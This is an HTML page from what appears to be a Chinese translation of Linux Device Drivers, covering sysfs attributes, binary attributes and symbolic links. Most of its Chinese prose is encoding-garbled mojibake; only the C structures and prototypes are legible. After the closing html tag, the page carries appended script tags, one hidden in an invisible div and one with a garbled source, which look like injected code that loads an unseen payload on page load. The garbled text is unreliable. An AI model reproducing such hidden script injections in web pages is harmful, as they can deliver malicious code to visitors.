<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>14.2.&#160;ͼ sysfs -Linux豸棨İ棩</title>
<meta name="description" content="" />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,,Ƶ" />
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="ch14.html" title="&#160;14&#160;&#160;Linux 豸ģ">
<link rel="prev" href="ch14.html" title="&#160;14&#160;&#160;Linux 豸ģ">
<link rel="next" href="ch14s03.html" title="14.3.&#160;Ȳ¼">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">14.2.&#160;ͼ sysfs </th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch14.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;14&#160;&#160;Linux 豸ģ</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch14s03.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="LowLevelSysfsOperations.sect"></a>14.2.&#160;ͼ sysfs </h2></div></div></div>
<p>kobject  sysfs ļϵͳ֮Ļ. ÿ sysfs зֵĿ¼, һ kobject Ǳںĳ. ÿȤ kobject Ҳһ,  kobject  sysfs Ŀ¼, Ϊں˲Ϣļ. ڼ kobject  sysfs ڵͲ㽻.</p>
<p>ʹ sysfs ĴӦ &lt;linux/sysfs.h&gt;.</p>
<p>ʹһ kobject  sysfs ֽǵ kobject_add . ѾΪһ kobject һ kset ķʽ;  sysfs дҲĹһ. һЩֵ֪,  sysfs δ:</p>
<div class="itemizedlist"><ul type="disc">
<li><p>kobjects  sysfs һֱΪĿ¼, һ kobject_add ĵõsysfs дһĿ¼. , Ŀ¼һ; Ժָ.</p></li>
<li><p> kobject (  kobject_set_name ) Ǹ sysfs Ŀ¼ʹõ. ,  sysfs εֵͬ kobjects жص.  kobjects ҲӦǺļ: ǲܰбַ, ҿհ׵ʹǿҲƼ.</p></li>
<li><p>sysfs λڶӦ kobject  parent ָĿ¼.  parent  NULL  kobject_add ʱ, ΪǶ kobject  kset е kobject; , sysfs 㼶ƥʹ kset ڲ.  parent  kset  NULL, sysfs Ŀ¼ڶ, ⼸ȻҪ.</p></li>
</ul></div>
<p>ʹ, ǿʹһ kobject  sysfs дһĿ¼. , Ȥ, ʱ俴Եʵ.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="DefaultAttributes.sect"></a>14.2.1.&#160;ȱʡ</h3></div></div></div>
<p>ʱ, ÿ kobject һȱʡ. Щͨ kobj_type ṹָ. ṹ, ס, :</p>
<pre class="programlisting">
struct kobj_type {
 void (*release)(struct kobject *);
 struct sysfs_ops *sysfs_ops;
 struct attribute **default_attrs; 
}; 
</pre>
<p>default_attr Աо˶ÿ͵ kobject ,  sysfs_ops ṩʵЩ. Ǵ default_attrs ʼ, ָһָԽṹָ:</p>
<pre class="programlisting">
struct attribute {
 char *name;
 struct module *owner;
 mode_t mode; 
}; 
</pre>
<p>ṹ, name Ե( ͬ kobject  sysfs Ŀ¼), owner һָģָ(һ), ģ鸺Եʵ,  mode ӦõԵıλ. mode  S_IRUGO ֻ; ǿд, ӳ S_IWUSR ֻ root дȨ( modes ĺ궨 &lt;linux/stat.h&gt; ). default_attrs беһڱ 0 .</p>
<p>default_attr ˵Щʲô, ûи sysfs ʵЩ. 䵽 kobj_type-&gt;sysfs_ops Ա, ָһṹ, Ϊ:</p>
<pre class="programlisting">
struct sysfs_ops {
 ssize_t (*show)(struct kobject *kobj, struct attribute *attr, char *buffer);
 ssize_t (*store)(struct kobject *kobj, struct attribute *attr, const char *buffer, size_t size);
};
</pre>
<p>ۺʱһԴûռȡ, show һָ kobject ָʵԽṹ. Ӧֵ, Ҫȷûи(  PAGE_SIZE ֽ), ҷʵʵıݵĳ. sysfs ĹÿӦһ, ˿ɶֵ; Ϣ, ҪǽΪ.</p>
<p>ͬ show еĺ͸ kobject . ݵ attr ָҪĸ. һЩ show ӵһϵв. ʵֽԽṹǶһṹ, ҪֵϢ; , container_of  show һָǶṹָ.</p>
<p>store ; Ӧڻݱ( size ݵĳ, ⲻܳ PAGE_SIZE ), 洢κĵķʽӦ, ҷʵʱֽ. store ֻԵдű. дһ store ʱ, ҪڽûռϢ; ӦڲȡӦ֮ǰǳСĵ֤. ݲƥ, һĴֵ, ǿܵһЩҪĺ޷ָ. 豸һٵ, ӦҪһضַд; һżȻ, дӦֻһ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="NondefaultAttributes.sect"></a>14.2.2.&#160;ȱʡ</h3></div></div></div>
<p>, kobject ͵ default_attrs Աе kobject ӵе. ǲһе; ӵɾ kojects. һԵһ kobject  sysfs Ŀ¼, 򵥵һԽṹҴ:</p>
<pre class="programlisting">
int sysfs_create_file(struct kobject *kobj, struct attribute *attr);
</pre>
<p>ж˳, ļʹԽṹиӴ, ҷֵ 0; , ͨĸ.</p>
<p>ע, ͬ show()  store() ʵֶԵĲ. һµ, ȱʡԵ kobject, ӦκαҪĲȷЩ֪ʵ.</p>
<p>Ϊȥһ, :</p>
<pre class="programlisting">
int sysfs_remove_file(struct kobject *kobj, struct attribute *attr); 
</pre>
<p>ڵú, Բٳ kobject  sysfs . ҪС, , һûռ̿һ򿪵ǸԵļ, Ѿȥ show  store Ȼ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="BinaryAttributes.sect"></a>14.2.3.&#160;</h3></div></div></div>
<p>sysfs һ˿ɶıʽֵ. ˵, ֻżȻغҪܹݵ. Ҫֻڱ봫, ɶ, ûռ豸. , ع̼豸Ҫ. һ豸ϵͳ, һûԱ( ͨȲλ); Ŵݹ̼뵽ںͨһ sysfs , ͬ"ں˹̼ӿ"һʾ.</p>
<p>ʹһ bin+attribute ṹ:</p>
<pre class="programlisting">
struct bin_attribute {
struct attribute attr;
size_t size;
ssize_t (*read)(struct kobject *kobj, char *buffer, loff_t pos, size_t size);
ssize_t (*write)(struct kobject *kobj, char *buffer, loff_t pos, size_t size);
};
</pre>
<p>, attr һԽṹ, , ӵ, ԵȨ,  size ԵС( 0 , ûֵ). read  write ַӦ; һμؿɱε, ÿεһҳ.  sysfs ûа취ָʾһд, ʵֶԵĴܹʽݵĽ.</p>
<p>Աȷ; ǲܽΪȱʡ. Ϊһ, :</p>
<pre class="programlisting">
int sysfs_create_bin_file(struct kobject *kobj, struct bin_attribute *attr);
</pre>
<p>ȥԿ:</p>
<pre class="programlisting">
int sysfs_remove_bin_file(struct kobject *kobj, struct bin_attribute *attr);
</pre>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="SymbolicLinks.sect"></a>14.2.4.&#160;</h3></div></div></div>
<p>sysfs ļϵͳͨṹ, ӳ kobjects Ĳ֯. ںжĹϵǸӸ. , һ sysfs  (/sys/devices )еϵͳ֪豸, (  /sys/bus ֮ )ʾ豸. Щ, , 豸Ĺϵ. չʾЩӹϵҪָ, ָ sysfs ͨʵ.</p>
<p>һ sysfs ׵:</p>
<pre class="programlisting">
int sysfs_create_link(struct kobject *kobj, struct kobject *target, char *name);
</pre>
<p>һ(Ϊ name)ָĿ sysfs Ϊһ kobj . һ,  sysfs κϵͳаװﶼ.</p>
<p>Ŀ걻ϵͳҲ. ڴ kobjects ķ, Ӧһ֪ kobjects ĸı, ĳֱ֤Ŀ kobjects ʧ. (  sysfs еķ )ر, ǲõı̷ҿܵûռĻ.</p>
<p>ȥӿʹ:</p>
<pre class="programlisting">
void sysfs_remove_link(struct kobject *kobj, char *name); 
</pre>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch14.html">һҳ</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch14.html">һ</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch14s03.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">&#160;14&#160;&#160;Linux 豸ģ&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;14.3.&#160;Ȳ¼</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>